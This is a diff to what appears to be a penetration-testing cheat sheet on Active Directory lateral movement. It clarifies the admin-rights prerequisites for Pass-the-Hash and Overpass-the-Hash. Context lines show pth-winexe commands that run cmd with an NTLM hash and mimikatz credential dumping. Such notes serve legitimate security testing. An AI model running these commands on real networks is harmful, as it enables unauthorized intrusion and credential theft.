@@ -223,9 +223,9 @@ PS> Invoke-Kerberoast.ps1
 ## AD Lateral Movement
 
 Pass-the-Hash
+* Requires pw-hash user to have local admin rights on target, as connection is made using the `Admin$` share.
 * Requires SMB connection through the firewall
 * Requires Windows File and Print Sharing feature to be enabled.
-* Requires local admin permissions, as connection is made using the `Admin$` share.
 ```
 $ pth-winexe -U [username]%[password_hash] //[target] [command_to_exec]
 $ pth-winexe -U Administrator%NTLMhash //10.1.1.1 cmd
@@ -233,7 +233,7 @@ $ pth-winexe -U Administrator%NTLMhash //10.1.1.1 cmd
 
 Overpass-the-Hash
 * "over" abuse a NTLM hash to gain a full Kerberos TGT or Service Ticket.
-* Requires local admin permissions on target to run PSEXEC.EXE
+* Requires pw-hash user to have local admin rights on target to run `psexec.exe`.
 ```
 # obtain NTLM hash
 mimikatz > sekurlsa::logonpasswords
